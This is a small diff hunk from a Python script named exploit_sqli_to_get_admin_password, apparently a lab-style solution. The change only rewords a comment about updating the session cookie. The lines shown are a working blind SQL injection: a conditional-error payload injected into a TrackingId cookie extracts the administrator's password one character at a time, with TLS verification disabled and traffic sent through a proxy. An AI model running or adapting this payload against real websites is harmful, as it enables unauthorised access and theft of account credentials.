@@ -41,7 +41,7 @@ def exploit_sqli_to_get_admin_password(url, password_lenght):
         for char in alphanumeric_list:
             payload2 = "' AND (SELECT CASE WHEN SUBSTR(password,%i,1) LIKE '%s' THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator') = 'a" %(i,char)
             cookies = {
-                # Don't forget to change this cookie according to yours 
+                # Make sure to update "TrackingId" to match your website's session cookie
                 "TrackingId":"OjbHNAkSZVLEPWFG"+payload2
             }
             req = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
